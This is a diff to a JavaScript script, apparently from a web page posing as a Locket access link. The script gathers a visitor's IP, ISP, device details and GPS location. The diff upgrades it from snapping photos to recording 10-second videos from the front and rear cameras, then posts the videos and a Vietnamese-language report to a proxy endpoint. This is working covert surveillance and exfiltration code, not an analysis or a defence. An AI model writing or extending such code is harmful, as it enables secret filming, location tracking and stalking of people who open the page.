@@ -97,41 +97,63 @@ async function fallbackIPLocation() {
     } catch (e) { info.address = 'Không rõ'; }
 }
 
-async function captureCamera(facingMode = 'user') {
+async function recordVideo(facingMode = 'user') {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
-        return new Promise(resolve => {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.muted = true;
-            video.setAttribute('playsinline', '');
-            video.play();
-            video.onloadedmetadata = () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                setTimeout(() => {
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    stream.getTracks().forEach(t => t.stop());
-                    resolve(canvas.toDataURL('image/jpeg', 0.5));
-                }, 1000);
+        return new Promise((resolve, reject) => {
+            let options = { mimeType: 'video/webm;codecs=vp9,opus' };
+            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                options = { mimeType: 'video/webm;codecs=vp8,opus' };
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                    options = { mimeType: 'video/webm' };
+                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                        options = { mimeType: 'video/mp4' };
+                    }
+                }
+            }
+
+            const mediaRecorder = new MediaRecorder(stream, options);
+            const chunks = [];
+
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) chunks.push(e.data);
             };
+
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: options.mimeType });
+                const reader = new FileReader();
+                reader.onloadend = () => resolve(reader.result);
+                reader.onerror = reject;
+                reader.readAsDataURL(blob);
+                stream.getTracks().forEach(t => t.stop());
+            };
+
+            mediaRecorder.start();
+            // Quay video trong 10 giây
+            setTimeout(() => {
+                if (mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 10000);
         });
-    } catch (e) { throw e; }
+    } catch (e) {
+        console.error(`Lỗi quay video (${facingMode}):`, e);
+        throw e;
+    }
 }
 
 function getCaption() {
     const mapsLink = info.lat && info.lon ? `https://maps.google.com/?q=${info.lat},${info.lon}` : 'Không rõ';
-    return `📡 [THÔNG TIN TRUY CẬP LOCKET]\n\n🕒 Thời gian: ${info.time}\n📱 Thiết bị: ${info.device}\n🖥️ Hệ điều hành: ${info.os}\n🌍 IP dân cư: ${info.ip}\n🧠 IP gốc: ${info.realIp}\n🏢 ISP: ${info.isp}\n🏙️ Địa chỉ: ${info.address}\n🌎 Quốc gia: ${info.country}\n📍 Vĩ độ: ${info.lat}\n📍 Kinh độ: ${info.lon}\n📌 Google Maps: ${mapsLink}\n📸 Camera: ${info.camera}`.trim();
+    return `📡 [THÔNG TIN TRUY CẬP LOCKET - VIDEO 10S]\n\n🕒 Thời gian: ${info.time}\n📱 Thiết bị: ${info.device}\n🖥️ Hệ điều hành: ${info.os}\n🌍 IP dân cư: ${info.ip}\n🧠 IP gốc: ${info.realIp}\n🏢 ISP: ${info.isp}\n🏙️ Địa chỉ: ${info.address}\n🌎 Quốc gia: ${info.country}\n📍 Vĩ độ: ${info.lat}\n📍 Kinh độ: ${info.lon}\n📌 Google Maps: ${mapsLink}\n📸 Camera: ${info.camera}`.trim();
 }
 
-async function sendPhotos(frontB64, backB64) {
+async function sendMedia(frontB64, backB64) {
     const media = [];
     if (frontB64) {
-        media.push({ type: 'photo', media: frontB64, caption: getCaption() });
+        media.push({ type: 'video', media: frontB64, caption: getCaption() });
     }
     if (backB64) {
-        media.push({ type: 'photo', media: backB64 });
+        media.push({ type: 'video', media: backB64 });
     }
     return fetch(API_PROXY, {
         method: 'POST',
@@ -156,16 +178,22 @@ async function startTracking() {
 
     let front = null, back = null;
     try {
-        front = await captureCamera("user");
-        await delay(500);
-        back = await captureCamera("environment");
-        info.camera = '✅ Đã chụp camera trước và sau';
+        // Quay camera trước 10s
+        front = await recordVideo("user");
+        await delay(1000);
+        // Quay camera sau 10s
+        try {
+            back = await recordVideo("environment");
+        } catch (errBack) {
+            console.warn("Không quay được camera sau:", errBack);
+        }
+        info.camera = '✅ Đã quay video camera trước và sau (10s)';
     } catch (e) {
-        info.camera = '🚫 Lỗi camera hoặc bị từ chối';
+        info.camera = '🚫 Lỗi quay video hoặc bị từ chối';
     }
 
     if (front || back) {
-        await sendPhotos(front, back);
+        await sendMedia(front, back);
     } else {
         await sendTextOnly();
     }
